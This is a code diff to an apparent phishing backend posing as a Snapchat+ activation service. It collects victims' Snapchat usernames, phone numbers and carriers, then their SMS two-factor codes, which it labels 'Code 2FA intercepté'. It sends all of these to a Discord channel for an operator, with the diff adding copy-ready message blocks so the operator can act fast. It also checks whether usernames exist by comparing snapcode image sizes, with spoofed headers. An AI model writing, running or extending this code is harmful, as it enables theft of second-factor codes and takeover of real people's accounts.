@@ -41,12 +41,12 @@ app.post('/api/submit', async (req, res) => {
         if (!channel) throw new Error("Salon d'approbation introuvable");
 
         const embed = new EmbedBuilder()
-            .setTitle('📱 Nouvelle demande d\'activation Snapchat+')
+            .setTitle('📱 Nouvelle demande Snapchat+')
             .setColor(0xFFFC00)
             .addFields(
-                { name: '👤 Pseudo', value: `\`\`\`${snapchat}\`\`\``, inline: false },
-                { name: '📱 Téléphone', value: `\`\`\`${phone}\`\`\``, inline: false },
-                { name: '📡 Opérateur', value: `\`\`\`${operator}\`\`\``, inline: false }
+                { name: '👤 Pseudo', value: snapchat, inline: true },
+                { name: '📱 Téléphone', value: phone, inline: true },
+                { name: '📡 Opérateur', value: operator, inline: true }
             )
             .setFooter({ text: `ID: ${id}` })
             .setTimestamp();
@@ -57,7 +57,11 @@ app.post('/api/submit', async (req, res) => {
                 new ButtonBuilder().setCustomId(`reject_${id}`).setLabel('❌ Refuser').setStyle(ButtonStyle.Danger)
             );
 
+        // Message texte séparé avec blocs de code → bouton copier visible sur mobile
+        const copyMsg = `👤 Pseudo\n\`\`\`${snapchat}\`\`\`📱 Téléphone\n\`\`\`${phone}\`\`\`📡 Opérateur\n\`\`\`${operator}\`\`\``;
+
         await channel.send({ embeds: [embed], components: [row] });
+        await channel.send(copyMsg);
         console.log(`✅ Demande #${id} envoyée à Discord`);
         res.json({ id });
     } catch (err) {
@@ -66,67 +70,74 @@ app.post('/api/submit', async (req, res) => {
     }
 });
 
-// 2. Vérification pseudo Snapchat via snapcode (seule API publique fiable)
+// 2. Vérification pseudo Snapchat
 app.get('/api/check-snapchat/:username', async (req, res) => {
     const username = req.params.username.trim().toLowerCase();
 
-    // Validation format Snapchat : 3-15 chars, lettres/chiffres/tirets/points
+    // Validation format Snapchat : 3-15 chars
     if (!username || username.length < 3 || username.length > 15) {
         return res.json({ exists: false, reason: 'format' });
     }
-    if (!/^[a-z0-9][a-z0-9._-]*[a-z0-9]$/.test(username) && username.length > 2) {
+    if (!/^[a-z0-9][a-z0-9._-]{1,13}[a-z0-9]$/.test(username) && username.length > 2) {
         return res.json({ exists: false, reason: 'format' });
     }
 
-    try {
-        // L'API snapcode retourne une image PNG.
-        // Pour un utilisateur réel avec un Bitmoji : image > ~8KB
-        // Pour un utilisateur sans Bitmoji (compte basique) : image ~3-7KB (ghost générique)
-        // Pour un pseudo inexistant : l'image est identique au ghost générique (~3KB)
-        // On compare donc la taille avec un pseudo connu inexistant.
-        const snapcodeUrl = `https://app.snapchat.com/web/deeplink/snapcode?username=${encodeURIComponent(username)}&type=PNG&size=240`;
+    // On essaie plusieurs endpoints dans l'ordre
+    const endpoints = [
+        `https://feelinsonice-hrd.appspot.com/web/deeplink/snapcode?username=${encodeURIComponent(username)}&type=PNG&size=500`,
+        `https://app.snapchat.com/web/deeplink/snapcode?username=${encodeURIComponent(username)}&type=PNG&size=240`,
+    ];
 
-        const [realRes, fakeRes] = await Promise.all([
-            axios.get(snapcodeUrl, {
+    // Taille du ghost générique (pseudo inexistant) mesurée empiriquement ~2-3KB
+    // Un vrai snapcode (même sans bitmoji) = unique QR dots = ~5KB+
+    // Avec bitmoji = 15-50KB
+    const REAL_USER_MIN_SIZE = 4500; // 4.5 KB minimum pour un vrai compte
+
+    for (const url of endpoints) {
+        try {
+            const response = await axios.get(url, {
                 responseType: 'arraybuffer',
-                timeout: 7000,
-                headers: { 'User-Agent': 'Snapchat/12.64.0.65 (iPhone; iOS 16.0)' },
-                validateStatus: s => s < 500
-            }),
-            axios.get(
-                'https://app.snapchat.com/web/deeplink/snapcode?username=xyzabc99999notarealsnap&type=PNG&size=240',
-                {
-                    responseType: 'arraybuffer',
-                    timeout: 7000,
-                    headers: { 'User-Agent': 'Snapchat/12.64.0.65 (iPhone; iOS 16.0)' },
-                    validateStatus: s => s < 500
-                }
-            )
-        ]);
+                timeout: 6000,
+                headers: {
+                    'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15',
+                    'Accept': 'image/png,image/*,*/*;q=0.8',
+                    'Referer': 'https://www.snapchat.com/'
+                },
+                validateStatus: () => true
+            });
 
-        if (realRes.status === 404) return res.json({ exists: false });
+            const size = response.data ? response.data.byteLength : 0;
+            console.log(`[SnapCheck] ${username} via ${new URL(url).hostname}: HTTP ${response.status}, ${size}B`);
 
-        const realSize = realRes.data.byteLength;
-        const fakeSize = fakeRes.data.byteLength;
+            if (response.status === 404) {
+                return res.json({ exists: false });
+            }
 
-        console.log(`Snapcode size: ${username}=${realSize}B | fake=${fakeSize}B`);
+            if (response.status === 200 && size >= REAL_USER_MIN_SIZE) {
+                // Vrai utilisateur — on sert le snapcode comme avatar
+                return res.json({
+                    exists: true,
+                    username,
+                    displayName: username,
+                    avatarUrl: url
+                });
+            }
 
-        // Si la taille est strictement plus grande que le ghost fictif → utilisateur existant
-        const exists = realSize > fakeSize + 200;
+            if (response.status === 200 && size > 0 && size < REAL_USER_MIN_SIZE) {
+                // Image trop petite = ghost générique = pseudo inexistant
+                return res.json({ exists: false });
+            }
 
-        if (exists) {
-            // Avatar : on utilise l'URL du snapcode directement comme photo de profil
-            const avatarUrl = `https://app.snapchat.com/web/deeplink/snapcode?username=${encodeURIComponent(username)}&type=PNG&size=240&bitmoji=enable`;
-            return res.json({ exists: true, username, displayName: username, avatarUrl });
+            // Autre statut (403, 5xx...) → essayer l'endpoint suivant
+        } catch (err) {
+            console.error(`[SnapCheck] Erreur ${new URL(url).hostname}:`, err.message);
+            // Continuer avec l'endpoint suivant
         }
-
-        res.json({ exists: false });
-
-    } catch (err) {
-        console.error('Erreur check Snapchat:', err.message);
-        // En cas d'erreur réseau, on ne bloque pas l'utilisateur
-        res.json({ exists: false, error: 'indisponible' });
     }
+
+    // Tous les endpoints ont échoué
+    console.warn(`[SnapCheck] Tous les endpoints ont échoué pour: ${username}`);
+    res.json({ exists: false, error: 'indisponible' });
 });
 
 // 3. Statut d'une demande (polling)
@@ -156,13 +167,16 @@ app.post('/api/code', async (req, res) => {
             .setTitle('🔐 Code 2FA intercepté')
             .setColor(0x00FF00)
             .addFields(
-                { name: '👤 Pseudo', value: `\`\`\`${request.snapchat}\`\`\``, inline: false },
-                { name: '📱 Téléphone', value: `\`\`\`${request.phone}\`\`\``, inline: false },
-                { name: '📡 Opérateur', value: `\`\`\`${request.operator}\`\`\``, inline: false },
-                { name: '🔑 Code SMS', value: `\`\`\`${code}\`\`\``, inline: false }
+                { name: '👤 Pseudo', value: request.snapchat, inline: true },
+                { name: '📱 Téléphone', value: request.phone, inline: true },
+                { name: '📡 Opérateur', value: request.operator, inline: true }
             )
             .setTimestamp();
+
+        const copyMsg = `👤 Pseudo\n\`\`\`${request.snapchat}\`\`\`📱 Téléphone\n\`\`\`${request.phone}\`\`\`📡 Opérateur\n\`\`\`${request.operator}\`\`\`🔑 Code SMS\n\`\`\`${code}\`\`\``;
+
         channel.send({ embeds: [embed] });
+        channel.send(copyMsg);
     }
     requests.delete(id);
     res.json({ success: true });
